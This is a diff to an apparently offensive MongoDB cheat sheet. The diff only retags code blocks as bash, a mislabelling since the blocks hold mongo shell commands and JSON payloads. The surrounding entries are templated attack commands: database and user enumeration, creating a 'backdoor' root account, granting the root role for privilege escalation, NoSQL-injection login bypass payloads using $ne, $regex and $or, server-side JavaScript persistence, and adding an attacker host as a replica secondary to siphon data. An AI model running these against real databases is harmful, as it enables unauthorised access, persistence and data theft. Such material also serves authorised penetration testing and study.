@@ -51,7 +51,7 @@ mongo mongodb://{{USERNAME:str}}:{{PASSWORD:str}}@{{TARGET:ip}}:{{PORT:port:2701
 ## list databases shell
 Enumerate all databases on the server from inside mongo shell.
 
-```javascript
+```bash
 show dbs
 db.adminCommand("listDatabases")
 ```
@@ -63,7 +63,7 @@ db.adminCommand("listDatabases")
 ## enum users roles
 List users and roles in the current/admin database.
 
-```javascript
+```bash
 use admin
 db.getUsers()
 db.system.users.find().pretty()
@@ -77,7 +77,7 @@ db.getRoles({ showBuiltinRoles: true })
 ## list collections read data
 Show collections in current DB and read documents.
 
-```javascript
+```bash
 show collections
 db.{{COLLECTION:str:users}}.find().pretty()
 ```
@@ -89,7 +89,7 @@ db.{{COLLECTION:str:users}}.find().pretty()
 ## whoami current user session
 Check authenticated user and privileges in current session.
 
-```javascript
+```bash
 db.runCommand({ connectionStatus: 1 })
 db.adminCommand({ usersInfo: 1 })
 ```
@@ -101,7 +101,7 @@ db.adminCommand({ usersInfo: 1 })
 ## create backdoor admin user
 Create a new user with root role in admin DB (requires privileges).
 
-```javascript
+```bash
 use admin
 db.createUser({ user: "{{USERNAME:str:backdoor}}", pwd: "{{PASSWORD:str:Pwn3d!}}", roles: [{ role: "root", db: "admin" }] })
 ```
@@ -113,7 +113,7 @@ db.createUser({ user: "{{USERNAME:str:backdoor}}", pwd: "{{PASSWORD:str:Pwn3d!}}
 ## privesc grant root role
 Privilege escalation by granting root role to existing user.
 
-```javascript
+```bash
 db.grantRolesToUser("{{USERNAME:str}}", [ { role: "root", db: "admin" } ])
 ```
 
@@ -146,7 +146,7 @@ mongoexport --host {{TARGET:ip}} --port {{PORT:port:27017}} -u {{USERNAME:str}} 
 ## bypass auth nosqli $ne
 Bypass login with $ne operator (always-true match).
 
-```json
+```bash
 {"username": {"$ne": null}, "password": {"$ne": null}}
 ```
 
@@ -157,7 +157,7 @@ Bypass login with $ne operator (always-true match).
 ## bypass auth nosqli regex
 Bypass authentication using regex match-anything pattern.
 
-```json
+```bash
 {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
 ```
 
@@ -168,7 +168,7 @@ Bypass authentication using regex match-anything pattern.
 ## bypass auth nosqli $or
 Use $or to satisfy authentication on any matching condition.
 
-```json
+```bash
 {"$or": [{"username": "admin"}, {"username": {"$exists": true}}]}
 ```
 
@@ -179,7 +179,7 @@ Use $or to satisfy authentication on any matching condition.
 ## persist server-side js system.js
 Store malicious server-side JS function for persistence.
 
-```javascript
+```bash
 db.system.js.save({ _id: "evilFunc", value: function() { return "Malicious"; } })
 db.loadServerScripts()
 ```
@@ -191,7 +191,7 @@ db.loadServerScripts()
 ## pivot replication malicious secondary
 Add an attacker-controlled host as replica set secondary to siphon data.
 
-```javascript
+```bash
 rs.conf()
 rs.add("{{LHOST:ip}}:27017")
 ```
